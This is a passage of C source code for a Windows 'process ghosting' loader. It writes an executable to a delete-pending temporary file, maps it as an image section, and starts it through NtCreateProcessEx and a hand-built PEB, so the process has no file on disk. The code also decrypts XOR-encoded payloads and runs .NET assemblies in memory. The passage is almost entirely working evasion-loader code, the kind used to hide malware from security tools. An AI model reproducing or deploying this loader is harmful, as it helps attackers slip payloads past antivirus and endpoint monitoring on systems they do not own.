    LPWSTR workingDirectory = NULL;
    int result = 1;
    if (!fullPath) {
        PrintWin32Error("GetFullPathNameW(managed memory target)");
        return 1;
    }
    if (!ReadFileIntoBuffer(fullPath, &assembly)) {
        goto cleanup;
    }
    if (ClassifyImageForCurrentBuild(
            assembly.Data,
            (DWORD)assembly.Size) != GHOST_IMAGE_MANAGED) {
        fprintf(stderr, "[-] Memory CLR target is not a managed PE.\n");
        goto cleanup;
    }
    workingDirectory = GetContainingDirectory(fullPath);
    result = RunManagedAssemblyBytesInCurrentProcess(
        assembly.Data,
        assembly.Size,
        argc - 1,
        argv + 1,
        workingDirectory);

cleanup:
    FreeDecodedBuffer(&assembly);
    free(workingDirectory);
    free(fullPath);
    return result;
}

static PBYTE RvaToFilePointer(
    PBYTE image,
    DWORD imageSize,
    DWORD rva,
    DWORD requiredSize,
    PIMAGE_FILE_HEADER fileHeader,
    PBYTE optionalHeader
) {
    PIMAGE_SECTION_HEADER section = (PIMAGE_SECTION_HEADER)(
        optionalHeader + fileHeader->SizeOfOptionalHeader);

    for (WORD i = 0; i < fileHeader->NumberOfSections; ++i) {
        DWORD sectionSize = section[i].Misc.VirtualSize;
        if (sectionSize < section[i].SizeOfRawData) {
            sectionSize = section[i].SizeOfRawData;
        }

        if (rva >= section[i].VirtualAddress &&
            rva - section[i].VirtualAddress < sectionSize) {
            DWORD delta = rva - section[i].VirtualAddress;
            DWORD rawOffset = section[i].PointerToRawData + delta;
            if (rawOffset <= imageSize && requiredSize <= imageSize - rawOffset) {
                return image + rawOffset;
            }
            return NULL;
        }
    }

    return NULL;
}

static WORD CurrentBuildMachine(void) {
#if defined(_M_ARM64) || defined(__aarch64__)
    return IMAGE_FILE_MACHINE_ARM64;
#elif defined(_M_X64) || defined(__x86_64__)
    return IMAGE_FILE_MACHINE_AMD64;
#elif defined(_M_IX86) || defined(__i386__)
    return IMAGE_FILE_MACHINE_I386;
#else
    return IMAGE_FILE_MACHINE_UNKNOWN;
#endif
}

// Native images must match the loader architecture. Pure IL managed images are
// accepted separately because the native x64 Windows loader calls
// _CorValidateImage, converts PE32 AnyCPU images in memory, and redirects their
// startup to _CorExeMain.
static GHOST_IMAGE_KIND ClassifyImageForCurrentBuild(
    PVOID buffer,
    DWORD fileSize
) {
    PBYTE image = (PBYTE)buffer;
    if (fileSize < sizeof(IMAGE_DOS_HEADER)) {
        return GHOST_IMAGE_INVALID;
    }

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)image;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE || dos->e_lfanew < 0 ||
        (DWORD)dos->e_lfanew > fileSize - sizeof(DWORD) - sizeof(IMAGE_FILE_HEADER)) {
        return GHOST_IMAGE_INVALID;
    }

    PBYTE ntBase = image + dos->e_lfanew;
    if (*(PDWORD)ntBase != IMAGE_NT_SIGNATURE) {
        return GHOST_IMAGE_INVALID;
    }

    PIMAGE_FILE_HEADER fileHeader = (PIMAGE_FILE_HEADER)(ntBase + sizeof(DWORD));
    PBYTE optionalHeader = (PBYTE)(fileHeader + 1);
    SIZE_T optionalHeaderOffset = (SIZE_T)(optionalHeader - image);
    if (optionalHeaderOffset > fileSize ||
        fileHeader->SizeOfOptionalHeader > fileSize - optionalHeaderOffset ||
        fileHeader->SizeOfOptionalHeader < sizeof(IMAGE_OPTIONAL_HEADER32)) {
        return GHOST_IMAGE_INVALID;
    }

    SIZE_T sectionTableOffset =
        optionalHeaderOffset + fileHeader->SizeOfOptionalHeader;
    SIZE_T sectionTableSize =
        (SIZE_T)fileHeader->NumberOfSections * sizeof(IMAGE_SECTION_HEADER);
    if (sectionTableOffset > fileSize ||
        sectionTableSize > fileSize - sectionTableOffset) {
        return GHOST_IMAGE_INVALID;
    }

    IMAGE_DATA_DIRECTORY comDirectory = { 0 };
    WORD optionalMagic = *(PWORD)optionalHeader;
    if (optionalMagic == IMAGE_NT_OPTIONAL_HDR32_MAGIC &&
        fileHeader->SizeOfOptionalHeader >= sizeof(IMAGE_OPTIONAL_HEADER32)) {
        PIMAGE_OPTIONAL_HEADER32 optional32 =
            (PIMAGE_OPTIONAL_HEADER32)optionalHeader;
        if (optional32->NumberOfRvaAndSizes > IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR) {
            comDirectory =
                optional32->DataDirectory[IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR];
        }
    } else if (optionalMagic == IMAGE_NT_OPTIONAL_HDR64_MAGIC &&
        fileHeader->SizeOfOptionalHeader >= sizeof(IMAGE_OPTIONAL_HEADER64)) {
        PIMAGE_OPTIONAL_HEADER64 optional64 =
            (PIMAGE_OPTIONAL_HEADER64)optionalHeader;
        if (optional64->NumberOfRvaAndSizes > IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR) {
            comDirectory =
                optional64->DataDirectory[IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR];
        }
    } else {
        fprintf(stderr, "[-] Unsupported or truncated PE optional header.\n");
        return GHOST_IMAGE_UNSUPPORTED;
    }

    if (comDirectory.VirtualAddress) {
        if (comDirectory.Size < sizeof(GHOST_COR20_HEADER_PREFIX)) {
            fprintf(stderr, "[-] Invalid CLR directory size.\n");
            return GHOST_IMAGE_UNSUPPORTED;
        }

        PGHOST_COR20_HEADER_PREFIX clrHeader = (PGHOST_COR20_HEADER_PREFIX)
            RvaToFilePointer(
                image,
                fileSize,
                comDirectory.VirtualAddress,
                sizeof(GHOST_COR20_HEADER_PREFIX),
                fileHeader,
                optionalHeader);
        if (!clrHeader) {
            fprintf(stderr, "[-] Invalid CLR header mapping.\n");
            return GHOST_IMAGE_UNSUPPORTED;
        }
        if ((clrHeader->Flags & COMIMAGE_FLAGS_32BITREQUIRED) != 0) {
            fprintf(stderr,
                "[-] A 32-bit-required managed image cannot run in the x64 CLR host.\n");
            return GHOST_IMAGE_UNSUPPORTED;
        }
        if ((clrHeader->Flags & COMIMAGE_FLAGS_ILONLY) == 0) {
            fprintf(stderr,
                "[-] Mixed-mode managed images are unsupported by memory CLR loading.\n");
            return GHOST_IMAGE_UNSUPPORTED;
        }

        return GHOST_IMAGE_MANAGED;
    }

    WORD buildMachine = CurrentBuildMachine();
    if (fileHeader->Machine != buildMachine) {
        fprintf(stderr,
            "[-] Architecture mismatch (target: 0x%04X, loader: 0x%04X).\n",
            fileHeader->Machine,
            buildMachine);
        return GHOST_IMAGE_UNSUPPORTED;
    }

#if !defined(_M_ARM64) && !defined(__aarch64__)
    SYSTEM_INFO nativeSystem;
    GetNativeSystemInfo(&nativeSystem);
    if (nativeSystem.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_ARM64) {
        fprintf(stderr,
            "[-] Emulated x86/x64 NtCreateProcessEx image creation is unsupported on this ARM64 host.\n");
        return GHOST_IMAGE_UNSUPPORTED;
    }
#endif

    return GHOST_IMAGE_NATIVE_COMPATIBLE;
}

static GHOST_IMAGE_KIND ClassifyImagePath(LPCWSTR imagePath) {
    HANDLE file = CreateFileW(
        imagePath,
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL);
    if (file == INVALID_HANDLE_VALUE) {
        PrintWin32Error("CreateFileW(classify)");
        return GHOST_IMAGE_INVALID;
    }

    DWORD fileSize = GetFileSize(file, NULL);
    if (fileSize == INVALID_FILE_SIZE || fileSize == 0) {
        PrintWin32Error("GetFileSize(classify)");
        CloseHandle(file);
        return GHOST_IMAGE_INVALID;
    }

    PVOID buffer = malloc(fileSize);
    if (!buffer) {
        fprintf(stderr, "[-] Failed to allocate the PE inspection buffer.\n");
        CloseHandle(file);
        return GHOST_IMAGE_INVALID;
    }

    DWORD bytesRead = 0;
    GHOST_IMAGE_KIND kind = GHOST_IMAGE_INVALID;
    if (ReadFile(file, buffer, fileSize, &bytesRead, NULL) &&
        bytesRead == fileSize) {
        kind = ClassifyImageForCurrentBuild(buffer, fileSize);
    } else {
        PrintWin32Error("ReadFile(classify)");
    }

    free(buffer);
    CloseHandle(file);
    return kind;
}

static LPWSTR GetCurrentExecutablePath(void) {
    DWORD capacity = 512;
    LPWSTR modulePath = NULL;

    for (;;) {
        LPWSTR resized = (LPWSTR)realloc(
            modulePath,
            (SIZE_T)capacity * sizeof(*resized));
        if (!resized) {
            free(modulePath);
            SetLastError(ERROR_NOT_ENOUGH_MEMORY);
            return NULL;
        }
        modulePath = resized;

        DWORD copied = GetModuleFileNameW(NULL, modulePath, capacity);
        if (!copied) {
            free(modulePath);
            return NULL;
        }
        if (copied < capacity - 1) {
            break;
        }
        if (capacity > 32768 / 2) {
            free(modulePath);
            SetLastError(ERROR_BUFFER_OVERFLOW);
            return NULL;
        }
        capacity *= 2;
    }
    return modulePath;
}

int CreateHiddenProcessFromPE(
    LPCWSTR imagePath,
    LPCWSTR commandLine,
    LPCWSTR currentDirectory,
    BOOL waitForExit,
    PDWORD processExitCode
) {
    NTSTATUS status;
    HANDLE hSection = NULL;
    HANDLE hProcess = NULL;
    HANDLE hThread = NULL;
    HANDLE hTempFile = INVALID_HANDLE_VALUE;
    PVOID pBuffer = NULL;
    PRTL_USER_PROCESS_PARAMETERS pParams = NULL;
    LPWCH pEnvironmentBlock = NULL;
    int success = 0;
     
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        PrintWin32Error("GetModuleHandleA");
        return 0;
    }

    pfnNtCreateProcessEx NtCreateProcessEx = (pfnNtCreateProcessEx)GetProcAddress(hNtdll, "NtCreateProcessEx");
    pfnNtCreateSection NtCreateSection = (pfnNtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
    pfnNtCreateThreadEx NtCreateThreadEx = (pfnNtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");
    pfnNtQueryInformationProcess NtQueryInformationProcess = (pfnNtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess");
    pfnRtlCreateProcessParametersEx RtlCreateProcessParametersEx = (pfnRtlCreateProcessParametersEx)GetProcAddress(hNtdll, "RtlCreateProcessParametersEx");
    pfnRtlDestroyProcessParameters RtlDestroyProcessParameters = (pfnRtlDestroyProcessParameters)GetProcAddress(hNtdll, "RtlDestroyProcessParameters");

    if (!NtCreateProcessEx || !NtCreateSection || !NtCreateThreadEx || !NtQueryInformationProcess ||
        !RtlCreateProcessParametersEx || !RtlDestroyProcessParameters) {
        PrintWin32Error("GetProcAddress");
        return 0;
    }

    // 1. 원본 PE 파일 읽기
    HANDLE hSourceFile = CreateFileW(
        imagePath,
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hSourceFile == INVALID_HANDLE_VALUE) {
        PrintWin32Error("CreateFileW(source)");
        return 0;
    }

    DWORD fileSize = GetFileSize(hSourceFile, NULL);
    if (fileSize == INVALID_FILE_SIZE || fileSize == 0) {
        PrintWin32Error("GetFileSize");
        CloseHandle(hSourceFile);
        return 0;
    }

    pBuffer = malloc(fileSize);
    if (!pBuffer) {
        CloseHandle(hSourceFile);
        return 0;
    }

    DWORD bytesRead = 0;
    if (!ReadFile(hSourceFile, pBuffer, fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
        PrintWin32Error("ReadFile(source)");
        free(pBuffer);
        CloseHandle(hSourceFile);
        return 0;
    }
    CloseHandle(hSourceFile);

    GHOST_IMAGE_KIND imageKind =
        ClassifyImageForCurrentBuild(pBuffer, fileSize);
    if (imageKind != GHOST_IMAGE_NATIVE_COMPATIBLE &&
        imageKind != GHOST_IMAGE_MANAGED) {
        if (imageKind == GHOST_IMAGE_INVALID) {
            fprintf(stderr, "[-] The image is not a valid PE file.\n");
        }
        free(pBuffer);
        return 0;
    }
    if (imageKind == GHOST_IMAGE_MANAGED && !IsNativeAmd64Host()) {
        fprintf(stderr,
            "[-] Direct managed-image ghosting requires native AMD64 Windows.\n");
        free(pBuffer);
        return 0;
    }

    // 2. 임시 파일 생성 및 기록 (DELETE_ON_CLOSE 옵션 적용)
    WCHAR tempPath[MAX_PATH];
    WCHAR tempFileName[MAX_PATH];
     
    if (GetTempPathW(MAX_PATH, tempPath) == 0) {
        PrintWin32Error("GetTempPathW");
        free(pBuffer);
        return 0;
    }
    if (GetTempFileNameW(tempPath, L"SEC", 0, tempFileName) == 0) {
        PrintWin32Error("GetTempFileNameW");
        free(pBuffer);
        return 0;
    }

    hTempFile = CreateFileW(
        tempFileName,
        GENERIC_READ | GENERIC_WRITE | DELETE,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        NULL,
        CREATE_ALWAYS,
        GHOST_TEMP_FILE_FLAGS,
        NULL
    );

    if (hTempFile == INVALID_HANDLE_VALUE) {
        PrintWin32Error("CreateFileW(temp)");
        free(pBuffer);
        return 0;
    }

    DWORD bytesWritten = 0;
    if (!WriteFile(hTempFile, pBuffer, fileSize, &bytesWritten, NULL) || bytesWritten != fileSize) {
        PrintWin32Error("WriteFile(temp)");
        free(pBuffer);
        CloseHandle(hTempFile);
        return 0;
    }
    free(pBuffer);
    pBuffer = NULL;

    // SEC_IMAGE가 파일의 완전한 내용을 보도록 캐시된 쓰기를 먼저 확정한다.
    if (!FlushFileBuffers(hTempFile)) {
        PrintWin32Error("FlushFileBuffers(temp)");
        CloseHandle(hTempFile);
        return 0;
    }

#if !defined(GHOST_DIAGNOSTIC_KEEP_FILE)
    // FILE_FLAG_DELETE_ON_CLOSE만으로는 SEC_IMAGE 매핑 후 파일이 남는 환경이
    // 있으므로, 매핑 전에 삭제 대기 상태를 명시적으로 설정한다.
    FILE_DISPOSITION_INFO disposition = { TRUE };
    if (!SetFileInformationByHandle(
            hTempFile,
            FileDispositionInfo,
            &disposition,
            sizeof(disposition))) {
        PrintWin32Error("SetFileInformationByHandle(FileDispositionInfo)");
        CloseHandle(hTempFile);
        return 0;
    }
#endif

    // 3. SEC_IMAGE 섹션 생성
    status = NtCreateSection(
        &hSection,
        SECTION_ALL_ACCESS,
        NULL,
        NULL,
        PAGE_READONLY,
        SEC_IMAGE,
        hTempFile
    );

    CloseHandle(hTempFile);
    hTempFile = INVALID_HANDLE_VALUE;

    if (!NT_SUCCESS(status) || !hSection) {
        PrintNtError("NtCreateSection(SEC_IMAGE)", status);
        return 0;
    }

    // 5. NtCreateProcessEx로 섹션 기반 프로세스 생성
    status = NtCreateProcessEx(
        &hProcess,
        GHOST_PROCESS_ACCESS,
        NULL,
        GetCurrentProcess(),
        0,
        hSection,
        NULL,
        NULL,
        0
    );

    CloseHandle(hSection);
    if (!NT_SUCCESS(status)) {
        PrintNtError("NtCreateProcessEx", status);
        return 0;
    }

    // 6. ProcessBasicInformation을 통해 PEB 주소 획득
    PROCESS_BASIC_INFORMATION pbi;
    ZeroMemory(&pbi, sizeof(pbi));
    ULONG retLen = 0;
    status = NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);

    if (!NT_SUCCESS(status) || !pbi.PebBaseAddress) {
        PrintNtError("NtQueryInformationProcess", status);
        fprintf(stderr,
            "[-] PEB address is unavailable (PID: %lu, returned: %lu bytes).\n",
            GetProcessId(hProcess),
            retLen);
        goto cleanup;
    }

    // 7. PEB 구조체로부터 ImageBaseAddress 읽기 (아키텍처별 올바른 오프셋 지정)
    PVOID imageBase = NULL;
#if defined(_WIN64)
    ULONG_PTR imageBaseOffset = 0x10; // x64 PEB.ImageBaseAddress 오프셋
#else
    ULONG_PTR imageBaseOffset = 0x08; // x86 PEB.ImageBaseAddress 오프셋
#endif

    if (!ReadProcessMemory(hProcess, (PBYTE)pbi.PebBaseAddress + imageBaseOffset, &imageBase, sizeof(PVOID), NULL) || !imageBase) {
        PrintWin32Error("ReadProcessMemory(PEB.ImageBaseAddress)");
        goto cleanup;
    }

    // 8. PE 엔트리 포인트 주소 계산 (생략 가능하나 유효성 검증용으로 유지)
    IMAGE_DOS_HEADER dosHeader;
    SIZE_T bytesReadRemote = 0;
    if (!ReadProcessMemory(hProcess, imageBase, &dosHeader, sizeof(IMAGE_DOS_HEADER), &bytesReadRemote) || dosHeader.e_magic != IMAGE_DOS_SIGNATURE) {
        PrintWin32Error("ReadProcessMemory(DOS header)");
        goto cleanup;
    }

    // 9. 프로세스 파라미터(ProcessParameters) 초기화 및 설정
    UNICODE_STRING uPath, uCurrentDir, uCommandLine;
    RtlInitUnicodeString(&uPath, imagePath);
    RtlInitUnicodeString(&uCurrentDir, currentDirectory);
    RtlInitUnicodeString(&uCommandLine, commandLine);

    pEnvironmentBlock = GetEnvironmentStringsW();
    if (!pEnvironmentBlock) {
        PrintWin32Error("GetEnvironmentStringsW");
        goto cleanup;
    }

    status = RtlCreateProcessParametersEx(
        &pParams,
        &uPath,
        NULL,
        &uCurrentDir,
        &uCommandLine,
        pEnvironmentBlock,
        NULL,
        NULL,
        NULL,
        NULL,
        RTL_USER_PROCESS_PARAMETERS_NORMALIZED
    );

    if (NT_SUCCESS(status) && pParams) {
        // Normalized 블록 내부 포인터는 현재 주소를 기준으로 구성된다. 프로세스
        // 파라미터와 환경 블록을 모두 원격의 같은 가상 주소 범위에 배치해야 한다.
        PRTL_USER_PROCESS_PARAMETERS_PREFIX paramsPrefix =
            (PRTL_USER_PROCESS_PARAMETERS_PREFIX)pParams;
        SIZE_T paramsSize = paramsPrefix->MaximumLength;
#if defined(_WIN64)
        const SIZE_T environmentPointerEnd = 0x80 + sizeof(PVOID);
#else
        const SIZE_T environmentPointerEnd = 0x48 + sizeof(PVOID);
#endif
        if (paramsSize < paramsPrefix->Length ||
            paramsPrefix->Length < environmentPointerEnd) {
            fprintf(stderr,
                "[-] Invalid process parameter block length.\n");
            goto cleanup;
        }

        PVOID paramsEnvironment =
            GetProcessParametersEnvironment(pParams);
        SIZE_T environmentSize =
            GetWideEnvironmentBlockSize((LPCWCH)paramsEnvironment);

        if (!paramsEnvironment || !environmentSize) {
            fprintf(stderr,
                "[-] RtlCreateProcessParametersEx returned no environment block.\n");
            goto cleanup;
        }

        ULONG_PTR allocationStart = (ULONG_PTR)pParams;
        ULONG_PTR environmentStart = (ULONG_PTR)paramsEnvironment;
        if (paramsSize > UINTPTR_MAX - allocationStart ||
            environmentSize > UINTPTR_MAX - environmentStart) {
            fprintf(stderr,
                "[-] Process parameter allocation range overflow.\n");
            goto cleanup;
        }

        ULONG_PTR allocationEnd = allocationStart + paramsSize;
        ULONG_PTR environmentEnd = environmentStart + environmentSize;
        if (environmentStart < allocationStart) {
            allocationStart = environmentStart;
        }
        if (environmentEnd > allocationEnd) {
            allocationEnd = environmentEnd;
        }
        if (allocationEnd <= allocationStart) {
            fprintf(stderr,
                "[-] Invalid process parameter allocation range.\n");
            goto cleanup;
        }
        SYSTEM_INFO systemInfo;
        GetSystemInfo(&systemInfo);
        ULONG_PTR allocationGranularity =
            (ULONG_PTR)systemInfo.dwAllocationGranularity;
        if (!allocationGranularity ||
            (allocationGranularity & (allocationGranularity - 1)) != 0) {
            fprintf(stderr, "[-] Invalid system allocation granularity.\n");
            goto cleanup;
        }

        ULONG_PTR allocationMask = allocationGranularity - 1;
        ULONG_PTR alignedAllocationStart = allocationStart & ~allocationMask;
        if (allocationEnd > UINTPTR_MAX - allocationMask) {
            fprintf(stderr,
                "[-] Aligned process parameter allocation range overflow.\n");
            goto cleanup;
        }
        ULONG_PTR alignedAllocationEnd =
            (allocationEnd + allocationMask) & ~allocationMask;
        if (alignedAllocationEnd <= alignedAllocationStart) {
            fprintf(stderr,
                "[-] Invalid aligned process parameter allocation range.\n");
            goto cleanup;
        }
        SIZE_T allocationSize =
            (SIZE_T)(alignedAllocationEnd - alignedAllocationStart);

        PVOID remoteAllocation = VirtualAllocEx(
            hProcess,
            (PVOID)alignedAllocationStart,
            allocationSize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE
        );

        if (remoteAllocation == (PVOID)alignedAllocationStart) {
            SIZE_T written = 0;
            PVOID remoteParams = pParams;
            if (WriteProcessMemory(
                    hProcess,
                    remoteParams,
                    pParams,
                    paramsSize,
                    &written) &&
                written == paramsSize &&
                WriteProcessMemory(
                    hProcess,
                    paramsEnvironment,
                    paramsEnvironment,
                    environmentSize,
                    &written) &&
                written == environmentSize) {
#if defined(_WIN64)
                ULONG_PTR paramsOffset = 0x20; // x64 PEB.ProcessParameters 오프셋
#else
                ULONG_PTR paramsOffset = 0x10; // x86 PEB.ProcessParameters 오프셋
#endif
                if (!WriteProcessMemory(
                        hProcess,
                        (PBYTE)pbi.PebBaseAddress + paramsOffset,
                        &remoteParams,
                        sizeof(remoteParams),
                        NULL)) {
                    PrintWin32Error("WriteProcessMemory(PEB.ProcessParameters)");
                    goto cleanup;
                }
            } else {
                PrintWin32Error("WriteProcessMemory(ProcessParameters)");
                goto cleanup;
            }
        } else {
            if (remoteAllocation) {
                VirtualFreeEx(hProcess, remoteAllocation, 0, MEM_RELEASE);
                SetLastError(ERROR_INVALID_ADDRESS);
            }
            PrintWin32Error("VirtualAllocEx(ProcessParameters)");
            goto cleanup;
        }
    } else {
        PrintNtError("RtlCreateProcessParametersEx", status);
        goto cleanup;
    }

    // 10. 엔트리 포인트 직접 실행 대신, PEB 내부의 인덱스나 파라미터를 갖춘 상태로 스레드 생성
    // (참고: SEC_IMAGE로 생성된 프로세스는 NtCreateThreadEx 시 EntryPoint가 자동으로 올바르게 동작함)
    PVOID pEntryPoint = NULL;
    BYTE ntHeaderBuffer[sizeof(IMAGE_NT_HEADERS64)];
    if (ReadProcessMemory(hProcess, (PBYTE)imageBase + dosHeader.e_lfanew, ntHeaderBuffer, sizeof(IMAGE_NT_HEADERS64), &bytesReadRemote)) {
        PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)ntHeaderBuffer;
        if (pNtHeaders->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
            PIMAGE_NT_HEADERS64 pNt64 = (PIMAGE_NT_HEADERS64)ntHeaderBuffer;
            pEntryPoint = (PVOID)((PBYTE)imageBase + pNt64->OptionalHeader.AddressOfEntryPoint);
        } else {
            PIMAGE_NT_HEADERS32 pNt32 = (PIMAGE_NT_HEADERS32)ntHeaderBuffer;
            pEntryPoint = (PVOID)((PBYTE)imageBase + pNt32->OptionalHeader.AddressOfEntryPoint);
        }
    }

    if (!pEntryPoint) {
        PrintWin32Error("ReadProcessMemory(NT headers)");
        goto cleanup;
    }

    status = NtCreateThreadEx(
        &hThread,
        THREAD_ALL_ACCESS,
        NULL,
        hProcess,
        pEntryPoint,
        NULL,
        FALSE,
        0,
        0,
        0,
        NULL
    );

    if (!NT_SUCCESS(status)) {
        PrintNtError("NtCreateThreadEx", status);
        goto cleanup;
    }

    printf("[+] Ghost process PID: %lu\n", GetProcessId(hProcess));
    printf("[+] Ghost entry thread started.\n");

    if (waitForExit) {
        DWORD waitResult = WaitForSingleObject(hProcess, INFINITE);
        if (waitResult != WAIT_OBJECT_0) {
            PrintWin32Error("WaitForSingleObject(ghost)");
            goto cleanup;
        }

        DWORD exitCode = 0;
        if (!GetExitCodeProcess(hProcess, &exitCode)) {
            PrintWin32Error("GetExitCodeProcess(ghost)");
            goto cleanup;
        }
        if (processExitCode) {
            *processExitCode = exitCode;
        }
        printf("[i] Ghost process exit code: 0x%08lX (%lu)\n",
            exitCode,
            exitCode);
    }

#if defined(GHOST_DIAGNOSTIC_WAIT)
    if (!waitForExit) {
        DWORD waitResult = WaitForSingleObject(hProcess, 5000);
        if (waitResult == WAIT_OBJECT_0) {
            DWORD exitCode = 0;
            if (GetExitCodeProcess(hProcess, &exitCode)) {
                printf("[i] Ghost process exit code: 0x%08lX (%lu)\n",
                    exitCode,
                    exitCode);
            } else {
                PrintWin32Error("GetExitCodeProcess(ghost)");
            }
        } else if (waitResult == WAIT_TIMEOUT) {
            printf("[i] Ghost process is still running after 5 seconds.\n");
        } else {
            PrintWin32Error("WaitForSingleObject(ghost)");
        }
    }
#endif

    success = 1;

cleanup:
    if (!success && hProcess) {
        TerminateProcess(hProcess, 0);
    }
    if (pParams && RtlDestroyProcessParameters) {
        RtlDestroyProcessParameters(pParams);
    }
    if (pEnvironmentBlock) {
        FreeEnvironmentStringsW(pEnvironmentBlock);
    }
    if (hThread) CloseHandle(hThread);
    if (hProcess) CloseHandle(hProcess);
    
    return success;
}

static int RunTargetCommand(int argc, wchar_t* argv[]) {
    if (argc < 2) {
        wprintf(
            L"Usage: %ls <absolute or relative path to PE file> [arguments...]\n",
            argv[0]);
        return 1;
    }

    LPWSTR fullPath = GetAbsolutePath(argv[1]);
    if (!fullPath) {
        PrintWin32Error("GetFullPathNameW");
        return 1;
    }

    GHOST_IMAGE_KIND targetKind = ClassifyImagePath(fullPath);
    if (targetKind == GHOST_IMAGE_INVALID ||
        targetKind == GHOST_IMAGE_UNSUPPORTED) {
        fprintf(stderr, "[-] Target PE validation failed.\n");
        free(fullPath);
        return 1;
    }

    LPWSTR currentDirectory = GetContainingDirectory(fullPath);
    WIDE_BUFFER commandLine = { 0 };

    if (!AppendCommandLineArgument(&commandLine, fullPath) ||
        !AppendCommandLineArguments(&commandLine, argc, argv, 2)) {
        fprintf(stderr, "[-] Failed to build the target command line.\n");
        free(commandLine.Data);
        free(currentDirectory);
        free(fullPath);
        return 1;
    }
    if (targetKind == GHOST_IMAGE_MANAGED) {
        if (!IsNativeAmd64Host()) {
            fprintf(stderr,
                "[-] Direct managed-image ghosting requires native AMD64 Windows.\n");
            free(commandLine.Data);
            free(currentDirectory);
            free(fullPath);
            return 1;
        }
        wprintf(L"[i] Direct managed PE ghost target: %ls\n", fullPath);
        wprintf(
            L"[i] The native x64 loader must redirect this image through _CorValidateImage/_CorExeMain.\n");
    } else {
        wprintf(L"[i] Native target PE: %ls\n", fullPath);
    }

    if (!currentDirectory) {
        currentDirectory = _wcsdup(L"C:\\Windows\\System32");
    }
    if (!currentDirectory) {
        fprintf(stderr, "[-] Failed to allocate the working directory.\n");
        free(commandLine.Data);
        free(fullPath);
        return 1;
    }

    DWORD processExitCode = 0;
    if (CreateHiddenProcessFromPE(
            fullPath,
            commandLine.Data,
            currentDirectory,
            FALSE,
            &processExitCode)) {
        wprintf(L"[+] Process successfully created and executed!\n");
        free(commandLine.Data);
        free(currentDirectory);
        free(fullPath);
        return 0;
    } else {
        wprintf(L"[-] Failed to create process.\n");
        free(commandLine.Data);
        free(currentDirectory);
        free(fullPath);
        return 1;
    }
}

static int RunVxorPackage(int argc, wchar_t* argv[]) {
    if (argc < 4) {
        fwprintf(stderr,
            L"Usage: %ls --vxor <input.vxor> <hex-key> [arguments...]\n",
            argv[0]);
        return 2;
    }

    unsigned char key[VXOR_MAX_KEY_SIZE] = { 0 };
    size_t keyLength = 0;
    DECODED_BUFFER decoded = { 0 };
    WCHAR temporaryPath[MAX_PATH] = { 0 };
    wchar_t** targetArguments = NULL;
    LPWSTR packagePath = NULL;
    LPWSTR workingDirectory = NULL;
    int result = 1;

    if (!ParseWideHexKey(argv[3], key, &keyLength)) {
        fprintf(stderr,
            "[-] Invalid VXOR key; use 1-%d bytes of hexadecimal text.\n",
            VXOR_MAX_KEY_SIZE);
        goto cleanup;
    }
    if (!DecodeVxorPackage(argv[2], key, keyLength, &decoded)) {
        goto cleanup;
    }
    SecureZero(key, sizeof(key));

    GHOST_IMAGE_KIND decodedKind = decoded.Size <= MAXDWORD
        ? ClassifyImageForCurrentBuild(decoded.Data, (DWORD)decoded.Size)
        : GHOST_IMAGE_UNSUPPORTED;
    if (decodedKind == GHOST_IMAGE_MANAGED) {
        wprintf(
            L"[i] Starting CLR v4 and loading the managed VXOR payload in the current process.\n");
        packagePath = GetAbsolutePath(argv[2]);
        if (!packagePath) {
            PrintWin32Error("GetFullPathNameW(managed VXOR package)");
            goto cleanup;
        }
        workingDirectory = GetContainingDirectory(packagePath);
        if (!workingDirectory) {
            fprintf(stderr,
                "[-] Failed to determine the managed VXOR working directory.\n");
            goto cleanup;
        }
        result = RunManagedAssemblyBytesInCurrentProcess(
            decoded.Data,
            decoded.Size,
            argc - 4,
            argv + 4,
            workingDirectory);
        goto cleanup;
    }
    if (decodedKind != GHOST_IMAGE_NATIVE_COMPATIBLE) {
        fprintf(stderr, "[-] VXOR payload is not a supported native or managed PE.\n");
        goto cleanup;
    }

    if (!WriteDecodedTemporaryPe(
            &decoded,
            temporaryPath,
            ARRAYSIZE(temporaryPath))) {
        goto cleanup;
    }
    FreeDecodedBuffer(&decoded);

    int targetArgumentCount = argc - 2;
    targetArguments = (wchar_t**)calloc(
        (size_t)argc,
        sizeof(*targetArguments));
    if (!targetArguments) {
        fprintf(stderr, "[-] Failed to allocate the VXOR argument vector.\n");
        goto cleanup;
    }

    targetArguments[0] = argv[0];
    targetArguments[1] = temporaryPath;
    for (int i = 4; i < argc; ++i) {
        targetArguments[i - 2] = argv[i];
    }

    result = RunTargetCommand(targetArgumentCount, targetArguments);

cleanup:
    SecureZero(key, sizeof(key));
    FreeDecodedBuffer(&decoded);
    free(targetArguments);
    free(workingDirectory);
    free(packagePath);
    if (temporaryPath[0] && !DeleteFileW(temporaryPath)) {
        DWORD deleteError = GetLastError();
        if (!MoveFileExW(
                temporaryPath,
                NULL,
                MOVEFILE_DELAY_UNTIL_REBOOT)) {
            SetLastError(deleteError);
            PrintWin32Error("DeleteFileW(decoded VXOR payload)");
        } else {
            fwprintf(stderr,
                L"[i] Locked VXOR temporary file scheduled for deletion: %ls\n",
                temporaryPath);
        }
    }
    return result;
}

int wmain(int argc, wchar_t* argv[]) {
    if (argc >= 2 && wcscmp(argv[1], GHOST_SELF_CHILD_SWITCH) == 0) {
